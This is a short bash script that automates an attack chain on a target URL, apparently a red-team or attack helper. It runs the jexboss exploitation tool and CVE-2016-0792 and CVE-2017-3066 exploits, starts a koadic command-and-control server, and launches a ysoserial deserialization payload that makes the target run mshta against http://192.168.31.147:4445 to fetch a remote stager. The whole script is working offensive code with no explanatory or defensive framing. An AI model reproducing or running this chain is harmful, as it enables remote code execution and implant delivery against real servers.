set -e
# $1 
url="$1"
curPwd="`pwd`/"
i="autoAttack"
tmux new -s $i -d

j="koadic"
tmux new -s $j -d


ipport=`echo $url|sed -E 's/http(s)?:\/\///g'|sed 's/\/.*$//g'`
httpPro=`echo $url|sed 's/:.*$//g'`
target=`echo $ipport|sed 's/:.*$//g'`
port=`echo $ipport|sed 's/.*://g'`
curIp=`ifconfig | grep inet | grep -v inet6 | awk '{print $2}'|head -n1`
# ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'


py2 /mytools/jexboss/jexboss.py -host $url
# python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt

py2 "${curPwd}/py/CVE-2016-0792.py" $ipport whoami --proto $httpPro

tmux send -t $j "
/mytools/koadic/koadic
set SRVHOST 192.168.31.147
set SRVPORT 4445
run
" Enter

# java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta http://192.168.31.147:4445/E7nnO'
# " Enter

tmux send -t $i "
java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta http://192.168.31.147:4445/E7nnO'
" Enter
py2 "${curPwd}/py/CVE-2017-3066cf_blazeds_des.py" $target $port $curIp 4445
